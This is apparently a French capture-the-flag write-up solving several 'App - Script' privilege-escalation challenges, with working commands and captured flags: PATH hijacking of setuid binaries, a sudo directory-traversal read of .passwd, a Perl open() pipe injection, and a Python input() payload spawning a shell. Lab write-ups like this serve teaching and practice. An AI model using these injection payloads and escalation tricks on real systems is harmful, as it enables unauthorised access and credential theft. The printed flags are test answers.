# Challenger app script

## 1. Bash - System 1

Liste des caractéristiques du challenge:

- L'écriture est autorisée uniquement sur les dossiers /tmp et /var/tmp
- L'exécutable présente des droits spécifique permettant d'interagir avec le fichier cible;
- Ni le code source ou l'exécutable ne peut être modifiée;
- La source du programme présente une seule fonction main en entre faisant appel à une function basse niveau qui permet l'exécution de command Bash et retourne le code status;
- La fonction appelle est ls sur un fichier écrite en dur.

Exploit:

Le progamme fait un appel system dont la commande ls est une command relative au $PATH.

```c
[...]
system("ls /challenge/app-script/ch11/.passwd");
[...]
```

Donc nous pouvons injecter une autre commande par le l'Environnement variable $PATH. En prenant soin de retirer les commandes dans le /bin pour éviter tout conflit avec notre commande créé dans le /var/tmp

```shell
$ cat /bin/cat > /var/tmp/ls
$ export PATH=/var/tmp
$ ./ch11
!oPe96a/.s8d5
```

## 2. sudo - faiblesse de configuration

Liste des caractéristiques du challenge:

- Le dossier /challenge/app-script/ch1 cracked appartient à un utilisateur spécifique ainsi qu'un groupe sous le même nom;
- Les listes de permissions autorisent pour l'utilisateur app-script-ch1 d'utiliser le UID app-script-ch1-cracked à partir du dossier /challenge/app-script/ch1.

```bash
$ ls -laR
.:
total 20
dr-xr-x---  4 app-script-ch1-cracked app-script-ch1         4096 mai   25  2015 .
drwxr-xr-x 17 root                   root                   4096 mars  17 09:30 ..
dr-xr-x--x  2 app-script-ch1         app-script-ch1         4096 janv.  8  2015 ch1
dr-xr-x--x  2 app-script-ch1-cracked app-script-ch1-cracked 4096 mai   25  2015 ch1cracked
-rw-r-----  1 app-script-ch1         app-script-ch1          217 mai   25  2015 readme.md

./ch1:
total 12
dr-xr-x--x 2 app-script-ch1         app-script-ch1 4096 janv.  8  2015 .
dr-xr-x--- 4 app-script-ch1-cracked app-script-ch1 4096 mai   25  2015 ..
-rw-r----- 1 app-script-ch1         app-script-ch1   92 janv.  8  2015 shared_notes
ls: cannot open directory ./ch1cracked: Permission denied
$ sudo -l
[...]
User app-script-ch1 may run the following commands on challenge02:
    (app-script-ch1-cracked) /bin/cat /challenge/app-script/ch1/ch1/*
```

On peut ainsi par un directory traversal récupérer le fichier .passwd.

```shell
$ sudo -u app-script-ch1-cracked /bin/cat /challenge/app-script/ch1/ch1/../ch1cracked/.passwd
b3_c4r3full_w1th_sud0
```

## 3. Bash - Système 2

De la même manière que le défi `Bash - Système 1`, la commande système passée est un `ls -lA`. On créé donc un dossier `/my_ls` dans le répertoire `/tmp` avec un fichier nommé `ls`. Enfin, on donne à ce fichier la commande pour venir lire le fichier passwd et on remplace le path afin que le programme `ch12` appelle notre `ls`.

```shell
# Ici, on créé le dossier contenant notre ls
app-script-ch12@challenge02:~$ cd /tmp
app-script-ch12@challenge02:/tmp$ mkdir lawyim_n && cd lawyim_n
app-script-ch12@challenge02:/tmp/lawyim_n$ touch ls
# On lui donne comme commande un `cat` du fichier `.passwd`
app-script-ch12@challenge02:/tmp/lawyim_n$ echo "/bin/cat /challenge/app-script/ch12/.passwd" > ls
app-script-ch12@challenge02:/tmp/lawyim_n$ ./ls
-bash: ./ls: Permission denied
# Il faut aussi lui donner les droits d'execution !
app-script-ch12@challenge02:/tmp/lawyim_n$ chmod +x ./ls
app-script-ch12@challenge02:/tmp/lawyim_n$ cd ~
# On change le path pour que notre ls soit appelé
app-script-ch12@challenge02:~$ export PATH=/tmp/lawyim_n
# On récupère le flag ! 
app-script-ch12@challenge02:~$ ./ch12
8a95eDS/*e_T#
```

## 4. Perl - Command injection

Le stdin est l'une des portes d'entre du programme atteignant uniquement un "open". Avec certaine recherche cette fonction semple portait une vulnérabilité d'injection de commande avec l'opérateur tuyau.

```shell
app-script-ch7@challenge02:~$ ./setuid-wrapper
*************************
* Stat File Service    *
*************************
>>> | cat .passwd
~~~ Statistics for "| cat .passwd" ~~~
Lines: 0
Words: 0
Chars: 0
PerlCanDoBetterThanYouThink
>>>
```

## 6. Python - input()

Ici le programme C est codé en dur ainsi il n'y a aucune possibilité d'exploitation. En revanche le fichier python présente un appel "input" qui lui est connu comme vulnérable car il évalue le code contenu dans le string puis renvois ça valeur.

```shell
app-script-ch6@challenge02:~$ ./setuid-wrapper
Please enter password : __import__("os").system("sh")
$ cat .passwd
13373439872909134298363103573901
```
